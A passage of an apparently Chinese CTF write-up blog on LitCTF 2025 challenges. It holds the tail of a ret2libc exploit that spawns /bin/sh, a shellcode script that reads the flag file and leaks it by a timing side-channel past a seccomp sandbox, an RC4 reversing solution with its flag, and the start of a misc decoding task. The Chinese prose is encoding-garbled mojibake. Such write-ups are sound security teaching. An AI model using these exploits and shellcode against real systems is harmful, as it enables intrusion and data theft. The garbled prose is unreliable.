class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(binsh)</span><br><span class="line">payload += p64(<span class="number">0x40101a</span>) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="litctf-2025shellcode"><a class="markdownIt-Anchor" href="#litctf-2025shellcode">#</a> [LitCTF 2025]shellcode</h2><p>â€‹çœ‹ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹æœ‰æ²™ç®±ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ seccomp-tools dump ./pwn</span><br><span class="line">Welcome LitCTF 2025</span><br><span class="line">Please input your shellcode: </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>â€‹64 ä½ï¼Œread è¢« banï¼Œåªæœ‰ openï¼Œåç¼–è¯‘çœ‹çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome LitCTF 2025&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  init_sandbox();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å°±æ˜¯ä¸€ä¸ª shellcode é¢˜ï¼Œæ˜è¯´äº†å†™å…¥ shellcodeï¼Œä½†æ˜¯ä¸èƒ½ readï¼Œæœ‰ open å€’æ˜¯å¯ä»¥è¡Œï¼Œå¯ä»¥è¯»å– flag æ–‡ä»¶åˆ°å†…å­˜å†è€ƒè™‘è¾“å‡ºçš„äº‹å„¿ï¼Œä½†æ˜¯å¥½åƒä¸å…è®¸è¾“å‡ºï¼Œè¿™é‡Œæœ‰ä¸ªæ–‡ç« è¯´çš„æ˜¯æµ‹ä¿¡é“çˆ†ç ´ï¼Œå°±æ˜¯æŠŠ flag è¯»åˆ°å†…å­˜ä¸­ï¼Œç„¶åå»çˆ†ç ´ï¼Œå¹¶ä¸”ç»™äº†ä¸ª shellcode å¯ä»¥å¢åŠ æ•ˆç‡å’Œå‡†ç¡®æ€§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, c</span>):</span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io=remote(<span class="string">&quot;node6.anna.nssctf.cn&quot;</span>,<span class="number">26324</span>)</span><br><span class="line">        <span class="comment"># io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;Please input your shellcode: \n&#x27;</span>)</span><br><span class="line">        sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">        push 0</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall </span></span><br><span class="line"><span class="string">        mov rsi, rdi</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        syscall </span></span><br><span class="line"><span class="string">        mov al, [rsp+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp al, &#123;&#125;</span></span><br><span class="line"><span class="string">        jbe $</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">        io.send(sc)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                io.recv(timeout=<span class="number">3</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">6</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l = <span class="number">0x20</span></span><br><span class="line">        r = <span class="number">0x80</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">                m = (l + r) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> find(i, m):</span><br><span class="line">                        r = m - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> l==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(l)</span><br><span class="line">        flag += <span class="built_in">chr</span>(l)</span><br><span class="line">        info(<span class="string">&quot;win!!!!!!!!!!!!!!!!!!!!!!!!! &quot;</span>)</span><br><span class="line">        info(flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;flag: &quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;d80c8e83-f706-4ec1-a0df-b304de99a80d&#125;</span></span><br><span class="line"><span class="comment">#æœ€åflag ï¼š NSSCTF&#123;d80c8e83-f706-4ec1-a0df-b304de99a80d&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol><li><code>movabs rax, 0x67616C66</code>  - è¿™æ˜¯ &quot;flag&quot; çš„ ASCII ç ï¼ˆå°ç«¯åºï¼Œå®é™…åœ¨å†…å­˜ä¸­æ˜¯ &quot;flag&quot;ï¼‰</li><li><code>push 0</code>  å’Œ  <code>push rax</code>  - å°† &quot;flag&quot; å­—ç¬¦ä¸²å‹å…¥æ ˆä¸­</li><li><code>push rsp</code>  å’Œ  <code>pop rdi</code>  - ä½¿ rdi æŒ‡å‘ &quot;flag&quot; å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆä½œä¸ºæ–‡ä»¶åï¼‰</li><li><code>mov rax, 2</code>  - è®¾ç½®ä¸º open ç³»ç»Ÿè°ƒç”¨ï¼ˆæ–‡ä»¶æ‰“å¼€ï¼‰</li><li><code>syscall</code>  - æ‰“å¼€ &quot;flag&quot; æ–‡ä»¶</li></ol><p>æ¥ä¸‹æ¥ï¼š</p><ol start="6"><li><code>mov rsi, rdi</code>  - å°†æ–‡ä»¶æè¿°ç¬¦æ”¾å…¥ rsi</li><li><code>mov rdi, rax</code>  - å°†æ–‡ä»¶æè¿°ç¬¦æ”¾å…¥ rdiï¼ˆä½œä¸º read çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰</li><li><code>mov rdx, 0x100</code>  - è®¾ç½®è¦è¯»å–çš„å­—èŠ‚æ•°ä¸º 256</li><li><code>syscall</code>  - è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆè¯»åˆ°æ ˆä¸Šï¼Œå› ä¸º rsi è¢«è®¾ç½®ä¸ºæ ˆæŒ‡é’ˆï¼‰</li></ol><p>æœ€åï¼š</p><ol start="10"><li><code>mov al, [rsp+&#123;&#125;]</code>  - ä»æ ˆä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼ˆæ–‡ä»¶å†…å®¹çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼‰</li><li><code>cmp al, &#123;&#125;</code>  - ä¸é¢„è®¾å€¼æ¯”è¾ƒ</li><li><code>jbe $</code>  - å¦‚æœå°äºç­‰äºï¼Œåˆ™æ— é™å¾ªç¯</li></ol></blockquote><h1 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h1><h2 id="litctf-2025easy_rc4"><a class="markdownIt-Anchor" href="#litctf-2025easy_rc4">#</a> [LitCTF 2025]easy_rc4:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">9</span>]; <span class="comment">// [rsp+7h] [rbp-319h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">31</span>]; <span class="comment">// [rsp+10h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+108h] [rbp-218h]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+10Ch] [rbp-214h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+10Eh] [rbp-212h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+110h] [rbp-210h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+118h] [rbp-208h]</span></span><br><span class="line">  _BYTE v11[<span class="number">232</span>]; <span class="comment">// [rsp+120h] [rbp-200h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+208h] [rbp-118h]</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+20Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+20Eh] [rbp-112h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">8</span>]; <span class="comment">// [rsp+210h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+218h] [rbp-108h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+220h] [rbp-100h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+228h] [rbp-F8h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+230h] [rbp-F0h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+238h] [rbp-E8h]</span></span><br><span class="line">  _BYTE v21[<span class="number">200</span>]; <span class="comment">// [rsp+240h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+308h] [rbp-18h]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+30Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [rsp+30Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// [rsp+318h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;FenKey!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_2020);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;rrrrrcccc4444444!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you input flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s40&quot;</span>, v5);</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="keyword">sizeof</span>(v11));</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)s2 = <span class="number">0x4973F431134ECC78</span>LL;</span><br><span class="line">  v16 = <span class="number">0x7E35F4C0734F6C4F</span>LL;</span><br><span class="line">  v17 = <span class="number">0xEA7A60194D7627CE</span>LL;</span><br><span class="line">  v18 = <span class="number">0xF61CDA8142C05D44</span>LL;</span><br><span class="line">  v19 = <span class="number">0x13F8FA94D9587264</span>LL;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  rc4_init(v4, <span class="number">8LL</span>, &amp;S);</span><br><span class="line">  rc4_crypt(v5, s1, <span class="number">40LL</span>, &amp;S);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_2076);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹keyï¼šFenKey!!</p><p>â€‹å¯†æ–‡ï¼ˆå°ç«¯åºï¼‰:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)s2 = <span class="number">0x4973F431134ECC78</span>LL;</span><br><span class="line">v16 = <span class="number">0x7E35F4C0734F6C4F</span>LL;</span><br><span class="line">v17 = <span class="number">0xEA7A60194D7627CE</span>LL;</span><br><span class="line">v18 = <span class="number">0xF61CDA8142C05D44</span>LL;</span><br><span class="line">v19 = <span class="number">0x13F8FA94D9587264</span>LL;</span><br></pre></td></tr></table></figure><p>â€‹æå–ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x78 0xCC 0x4E 0x13 0x31 0xF4 0x73 0x49 0x4F 0x6C 0x4F 0x73 0xC0 0xF4 0x35 0x7E 0xCE 0x27 0x76 0x4D 0x19 0x60 0x7A 0xEA 0x44 0x5D 0xC0 0x42 0x81 0xDA 0x1C 0xF6 0x64 0x72 0x58 0xD9 0x94 0xFA 0xF8 0x13</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ RC4 åŠ å¯†ä»£ç ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rc4_crypt</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// kr00_8</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = (v8 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v4 = *(<span class="type">unsigned</span> __int8 *)(v8 + a4) + v9;</span><br><span class="line">    v9 = (<span class="type">unsigned</span> __int8)(HIBYTE(v4) + *(_BYTE *)(v8 + a4) + v9) - HIBYTE(HIDWORD(v4));</span><br><span class="line">    swap(v8 + a4, a4 + v9);</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a2) = *(_BYTE *)((<span class="type">unsigned</span> __int8)(*(_BYTE *)(v8 + a4) + *(_BYTE *)(v9 + a4)) + a4) ^ *(_BYTE *)((<span class="type">int</span>)i + a1) ^ <span class="number">0x20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å­˜åœ¨ä¸€ä¸ªé¢å¤–çš„å¼‚æˆ–æ“ä½œï¼Œæ‰€ä»¥ä¹‹åå°±å¥½åŠäº†ï¼Œå¯†é’¥æ˜¯ FenKey!!ï¼Œå¯†æ–‡çš„ hex ä¸ºï¼š</p><blockquote><p>0x78 0xCC 0x4E 0x13 0x31 0xF4 0x73 0x49 0x4F 0x6C 0x4F 0x73 0xC0 0xF4 0x35 0x7E 0xCE 0x27 0x76 0x4D 0x19 0x60 0x7A 0xEA 0x44 0x5D 0xC0 0x42 0x81 0xDA 0x1C 0xF6 0x64 0x72 0x58 0xD9 0x94 0xFA 0xF8 0x13</p></blockquote><p>â€‹è¿›è¡Œ RC4 è§£å¯†ä¹‹åï¼Œå¯¹å…¶è¿›è¡Œå¯¹ 0x20 çš„å¼‚æˆ–å¾—åˆ° flagï¼š</p><p><code>LitCTF&#123;71bb2a06417a5306ba297ddcfce7b1b0&#125;</code></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc</h1><h2 id="litctf-2025çµæ„Ÿè‡å“©è‡å“©è‡å“©å“‡æ“¦çµæ„Ÿè‡çµæ„Ÿè‡"><a class="markdownIt-Anchor" href="#litctf-2025çµæ„Ÿè‡å“©è‡å“©è‡å“©å“‡æ“¦çµæ„Ÿè‡çµæ„Ÿè‡">#</a> [LitCTF 2025] çµæ„Ÿè‡ğŸ„å“©è‡å“©è‡å“©å“‡æ“¦çµæ„Ÿè‡çµæ„Ÿè‡ğŸ„</h2><p>â€‹é¡¹ç›® https://github.com/ProbiusOfficial/Lingicryptï¼Œå¯ä»¥ç›´æ¥è§£å¯†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ python exp.py -d &quot;çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦å“‡æ“¦å“‡æ“¦è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦å“©å“©å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡è‡å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©å“©å“©å“‡æ“¦è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“‡æ“¦è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ